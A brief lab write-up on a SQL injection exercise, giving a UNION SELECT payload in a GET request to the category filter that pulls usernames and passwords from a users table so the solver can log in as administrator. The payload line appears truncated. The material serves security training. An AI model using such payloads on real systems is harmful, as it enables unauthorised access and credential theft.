# Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

# Solution

![](../../Image/Pasted%20image%2020250513170606.png)

```
GET /filter?category=' UNION SELECT null,username || '~' || password FROM use
```

![](../../Image/Pasted%20image%2020250513170701.png)

=> Use this password to login administrator user.